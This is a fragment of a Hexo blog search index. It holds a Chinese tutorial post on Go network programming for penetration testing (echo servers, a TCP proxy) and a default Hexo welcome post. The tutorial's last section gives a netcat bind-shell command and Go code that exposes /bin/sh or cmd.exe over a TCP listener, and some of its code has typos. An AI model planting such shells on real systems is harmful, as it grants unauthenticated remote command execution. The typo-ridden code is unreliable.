class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> myreader <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*myreader)</span></span> Read(b []<span class="type">byte</span>) (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">   fmt.Println(<span class="string">&quot;&gt;read:&quot;</span>)</span><br><span class="line">   <span class="keyword">return</span> os.Stdin.Read(b)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> mywriter <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*mywriter)</span></span> Write(b []<span class="type">byte</span>) (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">   fmt.Println(<span class="string">&quot;&gt;write:&quot;</span>)</span><br><span class="line">   <span class="keyword">return</span> os.Stdout.Write(b)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> (</span><br><span class="line">      r myreader</span><br><span class="line">      w mywriter</span><br><span class="line">   )</span><br><span class="line">   input := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>)</span><br><span class="line">   read, err := r.Read(input)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line">   fmt.Printf(<span class="string">&quot;read %d from stdin\n&quot;</span>, read)</span><br><span class="line">   write, err := w.Write(input)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line">   fmt.Printf(<span class="string">&quot;write %d from stdout\n&quot;</span>, write)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><blockquote><p>read:<br>hello 2023!!!<br>read 15 from stdin<br>write:<br>hello 2023!!!<br>write 1024 from stdout</p></blockquote><h4 id="io-Copy"><a href="#io-Copy" class="headerlink" title="io.Copy()"></a>io.Copy()</h4><ul><li>将数据从Reader复制到Writer是一种非常常见的模式,这促使Go的io包中提供一个函数Copy()该函数可用于简化函数main()函数Copy()原型如下：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230119105051430.png" alt="image-20230119105051430"></p><h3 id="创建回显-echo-服务器"><a href="#创建回显-echo-服务器" class="headerlink" title="创建回显(echo)服务器"></a>创建回显(echo)服务器</h3><h5 id="基本回显server-go"><a href="#基本回显server-go" class="headerlink" title="基本回显server.go"></a>基本回显server.go</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">echo</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">   <span class="keyword">defer</span> conn.Close()</span><br><span class="line">   b := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> &#123;</span><br><span class="line">      size, err := conn.Read(b[<span class="number">0</span>:])</span><br><span class="line">      <span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">         log.Println(<span class="string">&quot;Client disconnected&quot;</span>)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> err != err &#123;</span><br><span class="line">         log.Println(<span class="string">&quot;connection error&quot;</span>)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">      &#125;</span><br><span class="line">      log.Printf(<span class="string">&quot;recerved %d bytes :%s\n&quot;</span>, size, <span class="type">string</span>(b))\</span><br><span class="line">      <span class="comment">//conn.Write()发送数据</span></span><br><span class="line">      _, err = conn.Write(b[<span class="number">0</span>:size])</span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Fatalln(<span class="string">&quot;unable to write data&quot;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   listener, _ := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:8888&quot;</span>)</span><br><span class="line">   log.Println(<span class="string">&quot;listning on 0.0.0.0:8888&quot;</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> &#123;</span><br><span class="line">      <span class="comment">//等待连接，在已建立连接创建net.conn</span></span><br><span class="line">      conn, _ := listener.Accept()</span><br><span class="line">      <span class="comment">//并发</span></span><br><span class="line">      <span class="keyword">go</span> echo(conn)</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h5 id="改进：加入带缓冲的监听器"><a href="#改进：加入带缓冲的监听器" class="headerlink" title="改进：加入带缓冲的监听器"></a>改进：加入带缓冲的监听器</h5><ul><li>依赖相当低级的函数调用、缓冲区跟踪以及重复的R&#x2F;W。</li><li>运行过程很乏味且容易出错</li><li>使用bufio包包装了Reader和Writer，并且有I&#x2F;O缓冲机制</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">echo</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">   <span class="keyword">defer</span> conn.Close()</span><br><span class="line">   reader := bufio.NewReader(conn)</span><br><span class="line">   s, err := reader.ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">   log.Printf(<span class="string">&quot;read %d bytes: %s\n&quot;</span>, <span class="built_in">len</span>(<span class="type">string</span>(s), s))</span><br><span class="line"></span><br><span class="line">   writer := bufio.NewWriter(conn)</span><br><span class="line">   <span class="keyword">if</span> _, err := writer.WriteString(s); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatalln(<span class="string">&quot;Unable to write data&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   writer.Flush() <span class="comment">//关闭写</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="使用Copy-进一步简化"><a href="#使用Copy-进一步简化" class="headerlink" title="使用Copy()进一步简化"></a>使用Copy()进一步简化</h5><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230119142006472.png" alt="image-20230119142006472"></p><h3 id="代理一个tcp客户端"><a href="#代理一个tcp客户端" class="headerlink" title="代理一个tcp客户端"></a>代理一个tcp客户端</h3><ul><li>本地主机(公司内网)&lt;-&gt;个人服务器(joesproxy.com)&lt;-&gt;目标站点(joescatcam.website)</li><li><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230119214430613.png" alt="image-20230119214430613"></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handle</span><span class="params">(src net.Conn)</span></span> &#123;</span><br><span class="line">   dst, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;joescatcam.website:80&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatalln(<span class="string">&quot;Unable to connnerct to our unreachable host&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> dst.Close()</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 在goroutine中运行以防止io.Copy被阻塞</span></span><br><span class="line">   <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">      <span class="comment">//将源的输出复制到目标 dst = src</span></span><br><span class="line">      <span class="keyword">if</span> _, err := io.Copy(dst, src); err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Fatalln(err)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;()</span><br><span class="line">   <span class="comment">//将目标的输出复制回源 src = dst</span></span><br><span class="line">   <span class="keyword">if</span> _, err := io.Copy(src, dst); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatalln(err)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   listener, _ := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:80&quot;</span>)</span><br><span class="line">   <span class="keyword">for</span> &#123;</span><br><span class="line">      conn, _ := listener.Accept()</span><br><span class="line">      <span class="keyword">go</span> handle(conn)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230119214317336.png" alt="image-20230119214317336"></p><h3 id="复现Netcat命令执行"><a href="#复现Netcat命令执行" class="headerlink" title="复现Netcat命令执行"></a>复现Netcat命令执行</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp <span class="number">8888</span> -e /bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Flusher包装bufio.Writer，显式刷新所有写入</span></span><br><span class="line"><span class="keyword">type</span> Flusher <span class="keyword">struct</span> &#123;</span><br><span class="line">   w *bufio.Writer</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//NewFlusher从io.Writer创建一个新的Flusher</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewFlusher</span><span class="params">(w io.Writer)</span></span> *Flusher &#123;</span><br><span class="line">   <span class="keyword">return</span> &amp;Flusher&#123;w: bufio.NewWriter(w)&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(foo *Flusher)</span></span> Write(b []<span class="type">byte</span>) (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">   count, err := foo.w.Write(b)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> err := foo.w.Flush(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> count, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handle</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">   <span class="comment">//显示调用/bin/sh并使用-i进入交互模式</span></span><br><span class="line">   <span class="comment">//这样就可以把它作为标准输入和标准输出</span></span><br><span class="line">   <span class="comment">//对于Windows：exec.Command(&quot;cmd.exe&quot;)</span></span><br><span class="line">   cmd := exec.Command(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-i&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//将标准输入设置为我们的连接</span></span><br><span class="line">   cmd.Stdin = conn</span><br><span class="line">   <span class="comment">//从连接创建一个Flusher用于标准输出</span></span><br><span class="line">   <span class="comment">//这样可以确保标准输出被充分刷新并通过met.Conn发送</span></span><br><span class="line">   cmd.Stdout = NewFlusher(conn)</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//运行命令</span></span><br><span class="line">    <span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatalln(err)</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li>上面的解决方案虽然可行，但不够优雅。</li><li>学习io.Pipe()函数，该函数时Go的同步内存管道。可用于连接Reader和Writer</li><li>func Pipe() (*PipeReader, *PipeWriter)</li><li>将PipeReader链接到TCP连接。可使<br>用goroutine防止代码被阻塞。命令的任何标准输出都将发送到writer，然后通过管道传<br>送到reader并通过TCP连接输出</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handle</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">    cmd := exex.Command(<span class="string">&quot;cmd.exe&quot;</span>)<span class="comment">//&quot;/bin/sh&quot;, &quot;-i&quot;</span></span><br><span class="line">    <span class="comment">//将标准输入设置为我们的连接</span></span><br><span class="line">    rp, wp := io.Pipe()</span><br><span class="line">    cmd.Stdin = conn</span><br><span class="line">    cmd.Stdout = wp</span><br><span class="line">    <span class="keyword">go</span> io.Copy(conn, rp)</span><br><span class="line">    cmd.Run()</span><br><span class="line">    conn.Close()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">listener, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:20080&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">conn, err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> handle(conn)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/02/01/%E5%85%B6%E4%BB%96/hello-world/"/>
      <url>/2023/02/01/%E5%85%B6%E4%BB%96/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
